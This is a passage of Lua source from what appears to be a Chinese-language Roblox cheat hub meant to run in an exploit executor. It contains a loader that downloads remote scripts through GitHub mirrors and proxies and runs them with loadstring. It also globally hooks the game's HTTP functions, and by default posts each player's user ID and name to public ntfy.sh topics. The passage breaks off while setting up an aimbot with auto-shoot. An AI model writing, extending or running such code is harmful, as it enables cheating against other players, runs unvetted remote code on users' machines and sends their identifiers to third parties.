if isfile("XJWLoadCache/mirror.txt")then return readfile("XJWLoadCache/mirror.txt")end
end)
if ok and type(v)=="string" and #v>0 then
_G.__XJW_MIRROR_PREF=(v:gsub("%s",""))
return _G.__XJW_MIRROR_PREF
end
return nil
end

local function __XJW_PREF_SET(name)
if not name then return end
_G.__XJW_MIRROR_PREF=name
if not __XJW_IO_OK then return end
pcall(function()
if not isfolder("XJWLoadCache")then makefolder("XJWLoadCache")end
writefile("XJWLoadCache/mirror.txt",name)
end)
end

local function __XJW_NORM(u)
local o,r,br,p=u:match("^https://github%.com/([^/]+)/([^/]+)/raw/([^/]+)/(.+)$")
if o then return "https://raw.githubusercontent.com/"..o.."/"..r.."/refs/heads/"..br.."/"..p end
o,r,br,p=u:match("^https://github%.com/([^/]+)/([^/]+)/blob/([^/]+)/(.+)$")
if o then return "https://raw.githubusercontent.com/"..o.."/"..r.."/refs/heads/"..br.."/"..p end
return u
end

local function __XJW_CANDS(u)
local out={}
u=__XJW_NORM(u)
local owner,repo,rest=u:match("^https://raw%.githubusercontent%.com/([^/]+)/([^/]+)/(.+)$")
if owner then
local branch,path=rest:match("^refs/heads/(.-)/(.+)$")
if not branch then branch,path=rest:match("^([^/]+)/(.+)$") end
if branch and path then
local mid=owner.."/"..repo.."@"..branch.."/"..path
table.insert(out,{"onms","https://jsd.onmicrosoft.cn/gh/"..mid})
table.insert(out,{"jsdelivr","https://cdn.jsdelivr.net/gh/"..mid})
table.insert(out,{"ghfast","https://ghfast.top/"..u})
table.insert(out,{"ghproxy","https://gh-proxy.com/"..u})
table.insert(out,{"fastly","https://fastly.jsdelivr.net/gh/"..mid})
table.insert(out,{"gcore","https://gcore.jsdelivr.net/gh/"..mid})
table.insert(out,{"testingcf","https://testingcf.jsdelivr.net/gh/"..mid})
end
table.insert(out,{"raw",u})
elseif u:find("pastebin.com",1,true) then
table.insert(out,{"allorigins","https://api.allorigins.win/raw?url="..__XJW_URLENC(u)})
table.insert(out,{"corsproxy","https://corsproxy.io/?"..__XJW_URLENC(u)})
table.insert(out,{"raw",u})
else
table.insert(out,{"raw",u})
table.insert(out,{"ghfast","https://ghfast.top/"..u})
table.insert(out,{"ghproxy","https://gh-proxy.com/"..u})
table.insert(out,{"allorigins","https://api.allorigins.win/raw?url="..__XJW_URLENC(u)})
end
local pref=__XJW_PREF_GET()
if pref then
for i,c in ipairs(out) do
if c[1]==pref and i>1 then
local hit=table.remove(out,i)
table.insert(out,1,hit)
break
end
end
end
return out
end

local function __XJW_ISCODE(body)
if type(body)~="string" or #body<24 then return false end
local head=body:sub(1,600):lower()
if head:find("<!doctype",1,true) then return false end
if head:find("<html",1,true) then return false end
if head:find("<head",1,true) then return false end
if head:find('"error"',1,true) then return false end
if head:find("404: not found",1,true) then return false end
if head:find("bad gateway",1,true) then return false end
return true
end

local __XJW_INTRY=false
local function __XJW_TRY(u)
__XJW_INTRY=true
local ok,body=pcall(function() return game:HttpGet(u,true) end)
__XJW_INTRY=false
if ok and __XJW_ISCODE(body) then return body end
ok,body=pcall(function() return request({Url=u,Method="GET",Headers={["User-Agent"]="Mozilla/5.0"}}).Body end)
if ok and __XJW_ISCODE(body) then return body end
ok,body=pcall(function() return HttpService:GetAsync(u,true) end)
if ok and __XJW_ISCODE(body) then return body end
return nil
end

__XJW_FETCH=function(url)
local cands=__XJW_CANDS(url)
local tried,total=0,0
for _,c in ipairs(cands) do
total=total+1
if tried<4 then
tried=tried+1
local body=__XJW_TRY(c[2])
if body then
__XJW_PREF_SET(c[1])
return body,c[1]
end
end
end
return nil,total
end

local function __XJW_EXEC(body,label)
local fn,err=loadstring(body)
if not fn then fn,err=loadstring(body,"="..tostring(label)) end
if not fn then
__XJW_NOTE("代码错误",tostring(label).." "..tostring(err):sub(1,70))
return false
end
local ok,e=pcall(fn)
if not ok then
__XJW_NOTE("运行错误",tostring(label).." "..tostring(e):sub(1,70))
return false
end
return true
end

local __XJW_Q,__XJW_RUNNING,__XJW_LOCK={},false,{}

local function __XJW_DO(url,label)
local body=__XJW_CREAD(url)
if body then
if __XJW_EXEC(body,label) then
__XJW_NOTE("已加载",tostring(label).."（缓存）")
end
return
end
local src
body,src=__XJW_FETCH(url)
if not body then
__XJW_NOTE("加载失败",tostring(label).." "..tostring(src or "?").." 条线路均不可用")
return
end
__XJW_CWRITE(url,body)
if __XJW_EXEC(body,label) then
__XJW_NOTE("已加载",tostring(label).."（"..tostring(src).."）")
end
end

local function __XJW_PUMP()
if __XJW_RUNNING then return end
__XJW_RUNNING=true
task.spawn(function()
while #__XJW_Q>0 do
local job=table.remove(__XJW_Q,1)
pcall(__XJW_DO,job[1],job[2])
__XJW_LOCK[job[1]]=nil
task.wait(0.2)
end
__XJW_RUNNING=false
end)
end

local function __XJW_RUN(url,label)
local label=label or "远程脚本"
url=tostring(url)
if __XJW_LOCK[url]then
__XJW_NOTE("请稍候",label.." 正在加载中")
return
end
__XJW_LOCK[url]=true
__XJW_NOTE("加载中",label)
table.insert(__XJW_Q,{url,label})
__XJW_PUMP()
end

local __XJW_ORIG_HTTPGET=game.HttpGet
local __XJW_INFETCH=false
local function __XJW_HOOK()
if type(__XJW_ORIG_HTTPGET)=="function"then
pcall(function()
game.HttpGet=function(self,url,...)
if type(url)=="string"and not __XJW_INFETCH and not __XJW_INTRY and url:sub(1,4)=="http"then
__XJW_INFETCH=true
local body=__XJW_FETCH(url)
__XJW_INFETCH=false
if body then return body end
end
return __XJW_ORIG_HTTPGET(self,url,...)
end
end)
end
pcall(function()
local g=(getgenv and getgenv())or _G
if type(g.HttpGet)=="function"then
local o=g.HttpGet
g.HttpGet=function(url,...)
if type(url)=="string"and not __XJW_INFETCH and not __XJW_INTRY and url:sub(1,4)=="http"then
__XJW_INFETCH=true
local body=__XJW_FETCH(url)
__XJW_INFETCH=false
if body then return body end
end
return o(url,...)
end
end
end)
pcall(function()
local g=(getgenv and getgenv())or _G
if type(g.HttpGetAsync)=="function"then
local o=g.HttpGetAsync
g.HttpGetAsync=function(url,...)
if type(url)=="string"and not __XJW_INFETCH and not __XJW_INTRY and url:sub(1,4)=="http"then
__XJW_INFETCH=true
local body=__XJW_FETCH(url)
__XJW_INFETCH=false
if body then return body end
end
return o(url,...)
end
end
end)
end
__XJW_HOOK()

local __XJW_FILL=function()

local __frozenSides={}
for _,__tab in pairs(Tabs)do
if type(__tab)=="table"and type(__tab.Sides)=="table"then
for _,__side in ipairs(__tab.Sides)do
if typeof(__side)=="Instance"and __side:IsA("ScrollingFrame")then
local __okF=pcall(function()
__side.AutomaticCanvasSize=Enum.AutomaticSize.None
end)
if __okF then table.insert(__frozenSides,__side)end
end
end
end
end
do
local gbCount=0
local ctlCount=0
local __paceT=os.clock()
local function yielding()
if not BOOT then return false end
return BOOT.finished~=true
end
local function __budget()
local now=os.clock()
if now-__paceT>=0.08 then
__paceT=now
task.wait()
end
end
local function hookMethod(obj,m,onDone)
if type(obj)~="table"then return end
local flag="__XJW_Wrap_"..m
if rawget(obj,flag)then return end
local raw=obj[m]
if type(raw)~="function"then return end
rawset(obj,flag,true)
rawset(obj,m,function(self,...)
local res=raw(self,...)
onDone(res)
return res
end)
end
local CTL_METHODS={"AddToggle","AddSlider","AddDropdown","AddButton","AddInput","AddKeyPicker","AddLabel","AddDivider","AddColorPicker","AddUIPassthrough","AddTextbox","AddCheckbox","AddTextInput"}
local GB_METHODS={"AddLeftGroupbox","AddRightGroupbox","AddLeftTabbox","AddRightTabbox","AddDependencyGroupbox"}
local function throttleGroup(g)
if type(g)~="table"then return g end
for _,m in ipairs(CTL_METHODS)do
hookMethod(g,m,function()
ctlCount=ctlCount + 1
if yielding()then __budget()end
end)
end
return g
end
for _,m in ipairs(GB_METHODS)do
for _,tab in pairs(Tabs)do
if type(tab)=="table"then
hookMethod(tab,m,function(res)
gbCount=gbCount + 1
throttleGroup(res)
if yielding()then __budget()end
end)
end
end
end
end
do
local SIDEBAR_WIDTH=176
local TEXT_OFFSET=38
local TEXT_SIZE=15
local function styleTabButtons()
if type(Library.TabButtons)~="table"then return end
for _,btn in ipairs(Library.TabButtons)do
if type(btn)=="table"then
local label=btn.Label
if label then
label.Visible=true
label.TextXAlignment=Enum.TextXAlignment.Left
label.TextSize=TEXT_SIZE
label.TextTransparency=0.3
label.Position=UDim2.fromOffset(TEXT_OFFSET,0)
label.Size=UDim2.new(1,-TEXT_OFFSET,1,0)
end
if btn.Padding then
btn.Padding.PaddingLeft=UDim.new(0,12)
btn.Padding.PaddingRight=UDim.new(0,12)
end
end
end
end
if type(Window.SetSidebarWidth)=="function"then
pcall(function()Window:SetSidebarWidth(SIDEBAR_WIDTH)end)
end
styleTabButtons()
task.defer(styleTabButtons)
task.delay(0.6,styleTabButtons)
task.delay(2,styleTabButtons)
end
local InfoBox=Tabs.Announcement:AddLeftGroupbox("信息","id-card")
local lp=game.Players.LocalPlayer
do
local avatarFrame=Instance.new("Frame")
avatarFrame.BackgroundTransparency=1
avatarFrame.Size=UDim2.new(1,0,1,0)
local avatarImage=Instance.new("ImageLabel")
avatarImage.Name="Avatar"
avatarImage.AnchorPoint=Vector2.new(0.5,0.5)
avatarImage.Position=UDim2.new(0.5,0,0.5,0)
avatarImage.Size=UDim2.new(0,96,0,96)
avatarImage.BackgroundTransparency=1
avatarImage.Image="rbxasset://textures/ui/iconAssetMissing.png"
avatarImage.ScaleType=Enum.ScaleType.Crop
avatarImage.BorderColor3=Color3.fromRGB(0,0,0)
avatarImage.Parent=avatarFrame
__R.img(function()
task.spawn(function()
local ok,url=pcall(function()
return game:GetService("Players"):GetUserThumbnailAsync(lp.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
end)
if ok and url and url~=""and avatarImage and avatarImage.Parent then
avatarImage.Image=url
end
end)
end)
InfoBox:AddUIPassthrough("InfoAvatar",{Instance=avatarFrame,Height=110})
end
InfoBox:AddLabel("用户名: "..lp.Name)
InfoBox:AddLabel("显示名称: "..lp.DisplayName)
InfoBox:AddLabel("用户ID: "..lp.UserId)
InfoBox:AddLabel("账户年龄(天): "..lp.AccountAge)
InfoBox:AddLabel("语言: "..lp.LocaleId)
local execName="未知"
pcall(function()execName=identifyexecutor()end)
InfoBox:AddLabel("注入器: "..execName)
InfoBox:AddLabel("游戏ID: "..tostring(game.PlaceId))
InfoBox:AddLabel("服务器ID: "..tostring(game.JobId))
InfoBox:AddLabel("Roblox版本: "..version())
InfoBox:AddLabel("设备: "..(game:GetService("UserInputService").TouchEnabled and "移动设备"or "电脑"))
InfoBox:AddButton("复制所有信息",function()
local info={}
table.insert(info,"=== XJW中心 - 信息 ===")
table.insert(info,"用户名: "..lp.Name)
table.insert(info,"显示名称: "..lp.DisplayName)
table.insert(info,"用户ID: "..lp.UserId)
table.insert(info,"账户年龄(天): "..lp.AccountAge)
table.insert(info,"注入器: "..execName)
table.insert(info,"游戏ID: "..tostring(game.PlaceId))
table.insert(info,"服务器ID: "..tostring(game.JobId))
table.insert(info,"Roblox版本: "..version())
table.insert(info,"=== "..os.date("%Y-%m-%d %H:%M:%S").." ===")
pcall(function()setclipboard(table.concat(info,"\n"))end)
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="成功",Text="信息已复制到剪贴板",Duration=3})
end)
end)
InfoBox:AddButton("复制服务器ID",function()
pcall(function()setclipboard(tostring(game.JobId))end)
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="成功",Text="服务器ID已复制到剪贴板",Duration=3})
end)
end)
InfoBox:AddButton("重新加入当前服务器",function()
pcall(function()
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,lp)
end)
end)
InfoBox:AddButton("加入当前人最少的服务器",function()
task.spawn(function()
local http=game:GetService("HttpService")
local teleport=game:GetService("TeleportService")
local starterGui=game:GetService("StarterGui")
local targetJobId=nil
local bestCount=math.huge
local placeId=game.PlaceId
local function notify(text)
pcall(function()
starterGui:SetCore("SendNotification",{Title="提示",Text=text,Duration=5})
end)
end
local baseUrl="https://games.roblox.com/v1/games/"..tostring(placeId).."/servers/Public?limit=100&sortOrder=Asc"
local cursor=nil
local pagesGot=0
local candidates=0
for _=1,10 do
local url=baseUrl
if cursor then
url=baseUrl.."&cursor="..cursor
end
local res=nil
local lastErr=nil
for retry=1,3 do
local ok2,r=pcall(function()
return HttpService:GetAsync(url)
end)
if ok2 and r and r~=""then
res=r
break
else
lastErr=r
task.wait(1)
end
end
if not res then
notify("无法连接服务器列表，请确认游戏已开启「允许HTTP请求」（设置>安全>允许第三方HTTP请求）")
return
end
local ok3,json=pcall(function()
return http:JSONDecode(res)
end)
if not ok3 or not json or not json.data then
break
end
pagesGot=pagesGot+1
for _,s in json.data do
if s.id and s.playing and s.maxPlayers and s.playing<s.maxPlayers and s.id~=game.JobId then
candidates=candidates+1
if s.playing<bestCount then
bestCount=s.playing
targetJobId=s.id
end
end
end
cursor=json.nextPageCursor
if not cursor or#json.data==0 then
break
end
task.wait(0.5)
end
if targetJobId then
notify("正在加入最少人服务器（"..bestCount.."人）")
task.wait(1)
pcall(function()
teleport:TeleportToPlaceInstance(placeId,targetJobId,lp)
end)
else
if pagesGot==0 then
notify("服务器列表接口返回空数据，请稍后重试")
else
notify("当前服务器已是人最少的一个，未找到更少人的公开服务器")
end
end
end)
end)
local AnnouncementBox=Tabs.Announcement:AddRightGroupbox("公告","bell")
AnnouncementBox:AddLabel("祝你天天开心，脚本禁止倒卖 ")
AnnouncementBox:AddLabel("作者B站UID: 3706985503525348")
AnnouncementBox:AddLabel("脚本会持续更新，永久免费")
AnnouncementBox:AddLabel("此脚本诞生时间:2026年8月25日15时01分")
AnnouncementBox:AddLabel("更新时间: ".._lastUpdate)
AnnouncementBox:AddButton("复制QQ群:735780027",function()
pcall(function()setclipboard("735780027")end)
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="成功",Text="QQ群已复制到剪贴板",Duration=3})
end)
end)
local MakeBox=Tabs.Announcement:AddRightGroupbox("制作","hammer")
MakeBox:AddLabel({Text="此脚本仅i一人制作，所以更新有点慢，请理解。",DoesWrap=true})
pcall(function()
local PlayersOnline=game:GetService("Players")
local HttpOnline=game:GetService("HttpService")
local meOnline=PlayersOnline.LocalPlayer
local myJobShort=string.sub(tostring(game.JobId),1,8)
local ONLINE_CFG={
Topic="xjw_s_"..tostring(game.PlaceId).."_"..myJobShort,
Instances={"https://ntfy.sh","https://ntfy.envs.net"},
BeatEvery=30,
PullEvery=12,
Window=90,
MaxRows=100,
}
local beatEnabled=true
local viewEnabled=true
local activeInst=1
local lastListText=""
local function getRequestFn()
if type(request)=="function"then return request end
if type(http_request)=="function"then return http_request end
if type(HttpPost)=="function"then return HttpPost end
if type(syn)=="table"and type(syn.request)=="function"then return syn.request end
if type(http)=="table"and type(http.request)=="function"then return http.request end
return nil
end
local function httpGetText(url)
local fn=getRequestFn()
if fn then
local ok,r=pcall(fn,{
Url=url,
Method="GET",
Headers={["Cache-Control"]="no-cache",["Pragma"]="no-cache"},
})
if ok and type(r)=="table"and type(r.Body)=="string"then return r.Body end
end
local ok2,body=pcall(function()return HttpService:GetAsync(url)end)
if ok2 and type(body)=="string"then return body end
return nil
end
local function httpPostText(url,body)
local fn=getRequestFn()
if not fn then return false end
local ok,r=pcall(fn,{
Url=url,
Method="POST",
Headers={["Content-Type"]="text/plain"},
Body=body,
})
if not ok then return false end
if type(r)=="table"then
local code=tonumber(r.StatusCode)or tonumber(r.Status)
if code then return code>=200 and code<300 end
return true
end
return false
end
local function sendBeat()
local okEnc,body=pcall(function()
return HttpOnline:JSONEncode({
u=meOnline.UserId,
n=tostring(meOnline.Name),
j=myJobShort,
s=beatEnabled and 1 or 0,
})
end)
if not okEnc or type(body)~="string"then return false end
for i=0,#ONLINE_CFG.Instances-1 do
local idx=((activeInst-1+i)%#ONLINE_CFG.Instances)+1
if httpPostText(ONLINE_CFG.Instances[idx].."/"..ONLINE_CFG.Topic,body)then
activeInst=idx
return true
end
end
return false
end
local function postBeatHard()
local okEnc,body=pcall(function()
return HttpOnline:JSONEncode({
u=meOnline.UserId,
n=tostring(meOnline.Name),
j=myJobShort,
s=0,
})
end)
if not okEnc or type(body)~="string"then return false end
local any=false
for _,base in ipairs(ONLINE_CFG.Instances)do
if httpPostText(base.."/"..ONLINE_CFG.Topic,body)then
any=true
else
local fn=getRequestFn()
if fn then
local okJ=pcall(fn,{
Url=base,
Method="POST",
Headers={["Content-Type"]="application/json"},
Body=HttpOnline:JSONEncode({topic=ONLINE_CFG.Topic,message=body}),
})
if okJ then any=true end
end
end
end
return any
end
local function pullUsers()
local acc,order={},{}
local anyOk=false
for _,base in ipairs(ONLINE_CFG.Instances)do
local url=base.."/"..ONLINE_CFG.Topic.."/json?poll=1&since="..tostring(ONLINE_CFG.Window).."s"
.."&_="..tostring(os.time())..tostring(math.random(100000,999999))
local raw=httpGetText(url)
if type(raw)=="string"then
anyOk=true
for line in string.gmatch(raw,"[^\r\n]+")do
local okLine,msg=pcall(function()return HttpOnline:JSONDecode(line)end)
if okLine and type(msg)=="table"and type(msg.message)=="string"then
local okData,data=pcall(function()return HttpOnline:JSONDecode(msg.message)end)
if okData and type(data)=="table"and tonumber(data.u)
and string.sub(tostring(data.j or ""),1,8)==myJobShort then
local uid=tonumber(data.u)
local t=tonumber(msg.time)or 0
local entry=acc[uid]
if not entry then
acc[uid]={
uid=uid,
name=tostring(data.n or("用户"..tostring(uid))),
job=string.sub(tostring(data.j or ""),1,8),
time=t,
state=tonumber(data.s)or 1,
}
table.insert(order,uid)
elseif t>entry.time or(t==entry.time and(tonumber(data.s)or 1)==0)then
entry.time=t
entry.name=tostring(data.n or entry.name)
entry.state=tonumber(data.s)or 1
if data.j then entry.job=string.sub(tostring(data.j),1,8)end
end
end
end
end
if anyOk then break end
end
end
return acc,order,anyOk
end
local OnlineBox=Tabs.ScriptInfo:AddLeftGroupbox("本服使用玩家","users")
local onlinePanel=Instance.new("Frame")
onlinePanel.Name="XJWOnlinePanel"
onlinePanel.BackgroundTransparency=1
onlinePanel.ClipsDescendants=true
onlinePanel.Size=UDim2.new(1,0,1,0)
local statLabel=Instance.new("TextLabel")
statLabel.Name="Stat"
statLabel.BackgroundTransparency=1
statLabel.Position=UDim2.new(0,4,0,0)
statLabel.Size=UDim2.new(1,-8,0,22)
statLabel.Font=Enum.Font.Gotham
statLabel.TextSize=13
statLabel.TextXAlignment=Enum.TextXAlignment.Left
statLabel.TextColor3=Color3.fromRGB(235,235,240)
statLabel.Text="本服正在使用: 读取中..."
statLabel.Parent=onlinePanel
local scroll=Instance.new("ScrollingFrame")
scroll.Name="List"
scroll.BackgroundColor3=Color3.fromRGB(24,24,28)
scroll.BackgroundTransparency=0.35
scroll.BorderSizePixel=0
scroll.Position=UDim2.new(0,2,0,25)
scroll.Size=UDim2.new(1,-4,1,-28)
scroll.ClipsDescendants=true
scroll.ScrollingEnabled=true
scroll.ScrollingDirection=Enum.ScrollingDirection.Y
scroll.ElasticBehavior=Enum.ElasticBehavior.Never
scroll.ScrollBarThickness=6
scroll.ScrollBarImageColor3=Color3.fromRGB(170,170,180)
scroll.CanvasSize=UDim2.new(0,0,0,0)
scroll.ScrollBarImageTransparency=0.15
scroll.Parent=onlinePanel
pcall(function()
local corner=Instance.new("UICorner")
corner.CornerRadius=UDim.new(0,6)
corner.Parent=scroll
end)
local rowPool={}
local emptyLabel,moreLabel=nil,nil
local function clearRows()
for _,r in ipairs(rowPool)do
r.Row.Visible=false
end
if emptyLabel then emptyLabel.Visible=false end
if moreLabel then moreLabel.Visible=false end
end
local function buildRow(i)
local row=Instance.new("Frame")
row.Name="Row_"..tostring(i)
row.BackgroundTransparency=1
row.Visible=false
row.Position=UDim2.new(0,4,0,(i-1)*31)
row.Size=UDim2.new(1,-8,0,30)
row.Parent=scroll
local av=Instance.new("ImageLabel")
av.BackgroundTransparency=1
av.Position=UDim2.new(0,0,0.5,-13)
av.Size=UDim2.new(0,26,0,26)
av.Parent=row
local nm=Instance.new("TextLabel")
nm.BackgroundTransparency=1
nm.Position=UDim2.new(0,32,0,0)
nm.Size=UDim2.new(1,-120,1,0)
nm.Font=Enum.Font.Gotham
nm.TextSize=13
nm.TextXAlignment=Enum.TextXAlignment.Left
nm.TextTruncate=Enum.TextTruncate.AtEnd
nm.Parent=row
local tag=Instance.new("TextLabel")
tag.BackgroundTransparency=1
tag.AnchorPoint=Vector2.new(1,0)
tag.Position=UDim2.new(1,-8,0,0)
tag.Size=UDim2.new(0,88,1,0)
tag.Font=Enum.Font.Gotham
tag.TextSize=12
tag.TextXAlignment=Enum.TextXAlignment.Right
tag.TextColor3=Color3.fromRGB(150,150,160)
tag.Parent=row
local rec={Row=row,Av=av,Nm=nm,Tag=tag}
rowPool[i]=rec
return rec
end
local function fillRow(r,info)
r.Row.Visible=true
r.Av.Image="rbxthumb://type=AvatarHeadShot&id="..tostring(info.uid).."&w=48&h=48"
r.Nm.Text=info.name
if info.isMe then
r.Nm.TextColor3=Color3.fromRGB(255,205,90)
r.Tag.Text="我"
else
r.Nm.TextColor3=Color3.fromRGB(120,215,255)
r.Tag.Text="使用中"
end
end
local lastAcc,lastOrder,lastOk={},{},false
local lastSig=""
local prevCount=-1
local function renderUsers(acc,order,anyOk)
if not viewEnabled then
lastAcc,lastOrder,lastOk={},{},anyOk
lastSig="__off__"
prevCount=-1
pcall(clearRows)
pcall(function()scroll.CanvasSize=UDim2.new(0,0,0,0)end)
pcall(function()
statLabel.Text="已关闭查看 · 别人也看不到你"
statLabel.TextColor3=Color3.fromRGB(205,165,165)
end)
return
end
lastAcc,lastOrder,lastOk=acc,order,anyOk
local items={}
for _,uid in ipairs(order)do
local e=acc[uid]
if e then
local live=PlayersOnline:GetPlayerByUserId(uid)
if live and(e.state~=0 or uid==meOnline.UserId)then
e.isMe=(uid==meOnline.UserId)
local dn=tostring(live.DisplayName or "")
e.name=(dn~=""and dn)or tostring(live.Name)
table.insert(items,e)
end
end
end
local hasMe=false
for _,e in ipairs(items)do
if e.isMe then hasMe=true;break end
end
if not hasMe and viewEnabled then
local dn=tostring(meOnline.DisplayName or "")
table.insert(items,{
uid=meOnline.UserId,
name=(dn~=""and dn)or tostring(meOnline.Name),
time=os.time(),
state=1,
isMe=true,
})
end
table.sort(items,function(a,b)
if a.isMe~=b.isMe then return a.isMe end
return(a.time or 0)>(b.time or 0)
end)
local sigParts={anyOk and "1"or "0"}
for _,e in ipairs(items)do
sigParts[#sigParts+1]=tostring(e.uid).."|"..e.name.."|"..(e.isMe and "1"or "0")
end
local sig=table.concat(sigParts,",")
if sig==lastSig then return end
lastSig=sig
clearRows()
if#items~=prevCount then
prevCount=#items
pcall(function()scroll.CanvasPosition=Vector2.new(0,0)end)
end
if anyOk then
statLabel.Text="本服正在使用: "..tostring(#items).." 人"
statLabel.TextColor3=Color3.fromRGB(235,235,240)
else
statLabel.Text="检测失败 · 仅显示你自己"
statLabel.TextColor3=Color3.fromRGB(255,130,130)
end
local shown=0
local limit=math.min(#items,ONLINE_CFG.MaxRows)
for i=1,limit do
local r=rowPool[i]or buildRow(i)
fillRow(r,items[i])
shown=i
end
if#items==0 and anyOk then
if not emptyLabel then
local t=Instance.new("TextLabel")
t.BackgroundTransparency=1
t.Position=UDim2.new(0,0,0,8)
t.Size=UDim2.new(1,0,0,40)
t.Font=Enum.Font.Gotham
t.TextSize=12
t.TextColor3=Color3.fromRGB(140,140,150)
t.TextWrapped=true
t.Text="当前服务器里没有其他人正在使用本脚本"
t.Parent=scroll
emptyLabel=t
end
emptyLabel.Visible=true
end
if#items>shown then
if not moreLabel then
local m=Instance.new("TextLabel")
m.BackgroundTransparency=1
m.Size=UDim2.new(1,-8,0,30)
m.Font=Enum.Font.Gotham
m.TextSize=12
m.TextColor3=Color3.fromRGB(150,150,160)
m.TextXAlignment=Enum.TextXAlignment.Left
m.Parent=scroll
moreLabel=m
end
moreLabel.Position=UDim2.new(0,4,0,shown*31)
moreLabel.Text="还有 "..tostring(#items-shown).." 人未显示"
moreLabel.Visible=true
end
local canvasH=math.max(shown,1)*31+10
if#items>shown then canvasH=shown*31+40 end
scroll.CanvasSize=UDim2.new(0,0,0,canvasH)
local lines={}
for _,e in ipairs(items)do
table.insert(lines,e.name.." ["..(e.isMe and "我"or "使用中").."]")
end
lastListText="XJW 本服使用中 "..tostring(#items).." 人（"..os.date("%m-%d %H:%M").."）\n"..table.concat(lines,"\n")
end
task.spawn(function()
task.wait(1.2)
for i=1,ONLINE_CFG.MaxRows do
if not rowPool[i]then buildRow(i)end
if i%6==0 then task.wait()end
end
end)
pcall(function()
OnlineBox:AddUIPassthrough("XJWOnlinePlayers",{Instance=onlinePanel,Height=240})
end)
local refreshBusy=false
local renderToken=0
local function refreshNow()
if not viewEnabled then return end
if refreshBusy then return end
refreshBusy=true
local myToken=renderToken
task.spawn(function()
local okPull,acc,order,anyOk=pcall(pullUsers)
if myToken~=renderToken or not viewEnabled then
refreshBusy=false
return
end
if okPull then
pcall(renderUsers,acc,order,anyOk)
elseif lastSig~="__fail__"then
lastSig="__fail__"
pcall(function()
statLabel.Text="检测失败 · 仅显示你自己"
statLabel.TextColor3=Color3.fromRGB(255,130,130)
end)
end
refreshBusy=false
end)
end
pcall(function()
OnlineBox:AddButton("复制本服名单",function()
if lastListText==""then
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="提示",Text="当前没有名单可复制",Duration=3})
end)
return
end
pcall(function()setclipboard(lastListText)end)
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="成功",Text="本服名单已复制",Duration=3})
end)
end)
end)
local onlineToggle=nil
local function applyOnline(v)
v=v and true or false
if v==viewEnabled then return end
viewEnabled=v
beatEnabled=v
lastSig=""
renderToken=renderToken+1
if v then
statLabel.Text="本服正在使用: 读取中..."
statLabel.TextColor3=Color3.fromRGB(235,235,240)
pcall(renderUsers,{},{},true)
task.spawn(function()
pcall(sendBeat)
task.wait(0.6)
refreshNow()
end)
else
task.spawn(function()
local deadline=os.clock()+180
while os.clock()<deadline do
if beatEnabled then break end
pcall(postBeatHard)
task.wait(15)
end
end)
lastAcc,lastOrder,lastOk={},{},false
lastListText=""
prevCount=-1
pcall(clearRows)
pcall(function()scroll.CanvasSize=UDim2.new(0,0,0,0)end)
statLabel.Text="已关闭查看 · 别人也看不到你"
statLabel.TextColor3=Color3.fromRGB(205,165,165)
end
end
pcall(function()
onlineToggle=OnlineBox:AddToggle("XJW_OnlineReport",{Text="查看本服使用玩家",Default=true})
if onlineToggle and type(onlineToggle.OnChanged)=="function"then
onlineToggle:OnChanged(function(v)applyOnline(v)end)
end
end)
task.spawn(function()
while true do
task.wait(1)
pcall(function()
if onlineToggle and type(onlineToggle.Value)=="boolean"and onlineToggle.Value~=viewEnabled then
applyOnline(onlineToggle.Value)
end
end)
end
end)
pcall(function()
OnlineBox:AddLabel({Text="开启可查看本服使用此脚本玩家，同理关了别人就查看不了你使用了此脚本。",DoesWrap=true})
end)
pcall(function()
PlayersOnline.PlayerRemoving:Connect(function()
task.delay(0.5,function()
if viewEnabled then
pcall(renderUsers,lastAcc,lastOrder,lastOk)
end
end)
end)
PlayersOnline.PlayerAdded:Connect(function()
task.delay(0.8,function()
if viewEnabled then refreshNow()end
end)
end)
end)
task.spawn(function()
task.wait(2)
while true do
if beatEnabled then
local okSent=false
pcall(function()okSent=sendBeat()end)
task.wait(okSent and ONLINE_CFG.BeatEvery or 6)
else
task.wait(3)
end
end
end)
task.spawn(function()
task.wait(2.2)
while true do
pcall(function()
if viewEnabled then refreshNow()end
end)
task.wait(ONLINE_CFG.PullEvery)
end
end)
end)
do
local plrs=game:GetService("Players")
local me=plrs.LocalPlayer
local run=game:GetService("RunService")
local camera=workspace.CurrentCamera
local AimBox=Tabs.Aim:AddLeftGroupbox("自瞄","target")
local AimSideBox=Tabs.Aim:AddRightGroupbox("单独自瞄","crosshair")
AimSideBox:AddLabel({Text="如果你感到很卡的话，加载下面的单独自瞄",DoesWrap=true})
AimSideBox:AddButton({Text="点击加载单独透视自瞄",Func=function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/main/XJW自瞄透视.lua","XJW自瞄透视")
end})
local AimbotEnabled=false
local LockMode="普通"
local AimPart="Head"
local PriorityMode="准星最近"
local TeamCheck=false
local WallCheck=false
local FOVSize=150
local Smoothness=10
local ShowFOV=false
local AutoShoot=false
local PredictionAmount=0
local RequireWeapon=false
local IncludeNPCs=false
local SpecificTarget=nil
local Blacklist={}
local aimTarget=nil
local targetVelocity=Vector3.zero
local lastTargetPosition=Vector3.zero
local lastUpdateTime=0
local aimFOVCircle=nil
local blacklistLabel=nil
local function createAimFOVCircle()
pcall(function()
if aimFOVCircle then aimFOVCircle:Remove()end
end)
local ok,circle=pcall(function()
local c=Drawing.new("Circle")
c.Visible=false
c.Radius=FOVSize
c.Color=Color3.fromRGB(255,60,60)
c.Filled=false
c.Thickness=2
c.NumSides=80
c.Transparency=0.6
c.ZIndex=999
return c
end)
if ok and circle then
aimFOVCircle=circle
end
end
createAimFOVCircle()
local function isPetModel(obj)
if not obj then return false end
local ok,res=pcall(function()
local n=obj.Name
if n:find("Animal")or n:find("Pet")or n:find("宠物")or n:find("动物")then return true end
local attr=obj:GetAttribute("PetId")or obj:GetAttribute("AnimalId")or obj:GetAttribute("Owner")
if attr~=nil then return true end
return false
end)
return ok and res
end
local function aimGetCharacter(obj)
if obj:IsA("Player")then
return obj.Character
elseif obj:IsA("Model")then
if obj:FindFirstChild("Humanoid")and obj:FindFirstChild("HumanoidRootPart")then
return obj
end
elseif obj:IsA("BasePart")and obj.Parent then
local model=obj.Parent
